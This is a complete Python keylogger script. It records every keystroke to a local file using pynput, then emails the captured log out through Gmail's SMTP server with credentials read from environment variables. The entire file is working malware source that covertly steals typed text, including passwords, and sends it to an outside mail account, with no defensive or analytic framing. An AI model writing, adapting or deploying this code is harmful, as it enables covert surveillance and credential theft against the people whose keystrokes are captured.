from pynput import keyboard
import smtplib
import ssl
import os

# Email configuration
sender_mail = os.getenv('SENDER_EMAIL')  # Replace user@domain.com with your email id (everywhere)
#prefer using your own email id for receiver's as well.
receiver_mail = os.getenv('RECEIVER_EMAIL') # Replace user@domain.com with your email id (everywhere)
password = os.getenv('EMAIL_PASSWORD')  # Enter your Password here
port = 587

# Email content
message = """From: {}
To: {}                         
Subject: KeyLogs

Text: Keylogs 
"""
# .format(sender_mail, receiver_mail)

# Function to write logs to a file
def write(text):
    with open("keylogger.txt", 'a') as f:
        f.write(text)

# Function to handle key press events
def on_key_press(Key):
    try:
        if Key == keyboard.Key.enter:
            write("\n")
        else:
            write(Key.char)
    except AttributeError:
        if Key == keyboard.Key.backspace:
            write("\nBackspace Pressed\n")
        elif Key == keyboard.Key.tab:
            write("\nTab Pressed\n")
        elif Key == keyboard.Key.space:
            write(" ")
        else:
            temp = repr(Key) + " Pressed.\n"
            write(temp)
            print("\n{} Pressed\n".format(Key))

# Function to handle key release events
def on_key_release(Key):
    if Key == keyboard.Key.esc:
        return False

# Start the keylogger
with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    listener.join()

# Read the logged keys from the file
with open("keylogger.txt", 'r') as f:
    temp = f.read()
    message = message + str(temp)

# Send the email with the key logs
context = ssl.create_default_context()
try:
    with smtplib.SMTP('smtp.gmail.com', port) as server:
        server.starttls(context=context)
        server.login(sender_mail, password)
        server.sendmail(sender_mail, receiver_mail, message)
    print("Email sent to", sender_mail)
except Exception as e:
    print("Failed to send email:", e)
